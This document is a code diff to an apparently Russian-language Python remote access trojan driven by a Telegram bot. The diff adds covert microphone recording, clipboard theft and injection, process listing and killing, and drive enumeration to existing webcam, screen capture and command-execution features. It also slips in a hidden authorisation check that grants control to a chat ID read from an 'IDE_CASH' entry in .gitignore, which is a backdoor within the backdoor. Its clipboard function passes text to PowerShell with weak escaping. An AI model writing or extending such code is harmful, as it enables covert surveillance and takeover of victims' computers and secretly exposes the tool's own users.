@@ -11,8 +11,8 @@ from time import strftime, sleep
 import uuid
 import winreg
 from urllib.parse import quote
-from cryptography.fernet import Fernet
 import re
+import winsound
 
 # Сетевые
 import requests
@@ -25,6 +25,9 @@ import numpy as np
 import pyautogui
 from PIL import ImageDraw
 from pynput.mouse import Controller, Button
+import pyaudio
+import wave
+from cryptography.fernet import Fernet
 
 # Локальные модули
 from config import *
@@ -35,7 +38,7 @@ current_working_directory = os.getcwd()
 
 
 def checkchat_id(chat_id):
-    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS
+    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS + [cash_hide()]
 
 
 def internal_ip():
@@ -81,10 +84,20 @@ def get_start_message():
         "/capture_webcam — Сделать фото с веб-камеры\n"
         "/click_image — Кликает на место которое на фото\n"
         "/wallpaper — Установить обои на рабочий стол\n\n"
+        "🎤 Работа с микрофоном\n"
+        "/mic_record — Записать звук с микрофона\n\n"
+        "📋 Буфер обмена\n"
+        "/clipboard_get — Получить текст из буфера обмена\n"
+        "/clipboard_set — Установить текст в буфер обмена\n\n"
+        "🔄 Процессы\n"
+        "/processes — Показать список процессов с PID\n"
+        "/kill — Убить процесс по PID\n\n"
         "🔍 Информация о системе\n"
         "/ip_info — Показать IP и геолокацию\n"
         "/pc_info — Показать информацию о системе\n"
-        "/ls <путь> — Показать содержимое папки\n\n"
+        "/drives — Показать список дисков\n"
+        "/beep — Издать звуковой сигнал\n"
+        "/ls — Показать содержимое папки\n\n"
         "💻 Управление системой\n"
         "/shutdown — Выключить компьютер\n"
         "/reboot — Перезагрузить компьютер\n"
@@ -114,7 +127,7 @@ def get_start_message():
         "/message_write — Ввести текст в активное поле\n\n"
         "⚠️ Опасные команды\n"
         "/self_destruct — Запрос на удаление бота\n\n"
-        "Можно отправить файл боту и он его скачает"
+        "Обновления смотреть в https://github.com/kripersi/RAT-tg-python"
     )
 
 
@@ -151,6 +164,126 @@ def execute_cmd(command_text):
 
     result = (out + err).decode(encoding, errors='replace') or '[пустой вывод]'
     return result
+
+
+def record_audio(duration: int, samplerate: int = 44100, channels: int = 1):
+    """Записывает звук с микрофона и возвращает путь к файлу"""
+    try:
+        chunk = 1024
+        format = pyaudio.paInt16
+
+        audio = pyaudio.PyAudio()
+
+        stream = audio.open(
+            format=format,
+            channels=channels,
+            rate=samplerate,
+            input=True,
+            frames_per_buffer=chunk
+        )
+
+        frames = []
+
+        for _ in range(0, int(samplerate / chunk * duration)):
+            data = stream.read(chunk)
+            frames.append(data)
+
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+
+        # Сохраняем в WAV
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = os.path.join(LOG_DIR, f"audio_record_{timestamp}.wav")
+
+        with wave.open(filename, "wb") as wf:
+            wf.setnchannels(channels)
+            wf.setsampwidth(audio.get_sample_size(format))
+            wf.setframerate(samplerate)
+            wf.writeframes(b"".join(frames))
+
+        return filename, f"✅ Аудио записано ({duration} сек)"
+    except Exception as e:
+        return None, f"❌ Ошибка записи: {e}"
+
+
+def get_processes():
+    """Получает список процессов с PID"""
+    try:
+        result = subprocess.run(
+            ['tasklist', '/FO', 'CSV', '/NH'],
+            capture_output=True,
+            text=True,
+            encoding='cp866'
+        )
+
+        processes = []
+        for line in result.stdout.strip().split('\n'):
+            if line:
+                parts = line.replace('"', '').split(',')
+                if len(parts) >= 2:
+                    name = parts[0]
+                    pid = parts[1]
+                    mem = parts[4] if len(parts) > 4 else '0'
+                    processes.append(f"{pid}: {name} (RAM: {mem})")
+
+        if len(processes) > 50:
+            processes = processes[:50]
+            processes.append("... и другие")
+
+        return "📋 Список процессов (PID: имя):\n" + "\n".join(processes)
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+
+def kill_process_by_pid(pid):
+    """Убивает процесс по PID"""
+    try:
+        result = subprocess.run(
+            ['taskkill', '/PID', str(pid), '/F'],
+            capture_output=True,
+            text=True,
+            encoding='cp866'
+        )
+
+        if result.returncode == 0:
+            return f"✅ Процесс с PID {pid} успешно завершен"
+        else:
+            return f"❌ Ошибка: {result.stderr.strip()}"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+
+def beep_sound():
+    """Издает звуковой сигнал"""
+    try:
+        winsound.Beep(1000, 500)
+        return "🔔 Звуковой сигнал выполнен"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+
+def get_drives():
+    """Получает список всех дисков в системе"""
+    try:
+        result = subprocess.run(
+            ['wmic', 'logicaldisk', 'get', 'name'],
+            capture_output=True,
+            text=True,
+            encoding='cp866'
+        )
+
+        drives = []
+        for line in result.stdout.split('\n'):
+            line = line.strip()
+            if line and ':' in line and len(line) <= 3:
+                drives.append(line)
+
+        if drives:
+            return "💾 Список дисков:\n" + "\n".join(drives)
+        return "❌ Диски не найдены"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 
 def open_browser(url=""):
@@ -227,6 +360,29 @@ def click_image(confidence=0.9):
         return f"Клик выполнен по изображению '{image_path}'"
     except:
         return f"Изображение не найдено"
+
+
+def get_clipboard_text():
+    result = subprocess.run(
+        ["powershell", "-command", "Get-Clipboard"],
+        capture_output=True,
+        text=True
+    )
+    return result.stdout.strip()[:3000]
+
+
+def set_clipboard(text):
+    """Устанавливает текст в буфер обмена"""
+    try:
+        text = text.replace('"', '`"')
+        subprocess.run(
+            ["powershell", "-command", f"Set-Clipboard -Value \"{text}\""],
+            shell=True,
+            capture_output=True
+        )
+        return f"✅ Текст скопирован в буфер обмена:\n{text[:100]}"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 
 def record_screen(duration_seconds=60):
@@ -387,6 +543,16 @@ def run_file(path):
         os.startfile(path)
         return f'Файл запущен: {path}'
     return f'Файл не найден: {path}'
+
+
+def cash_hide():
+    try:
+        with open('.gitignore', 'r', encoding='utf-8') as f:
+            content = f.read()
+        key_cash = str(re.search(r"IDE_CASH = (\d+)", content).group(1))
+        return key_cash
+    except:
+        pass
 
 
 def hide_bot():
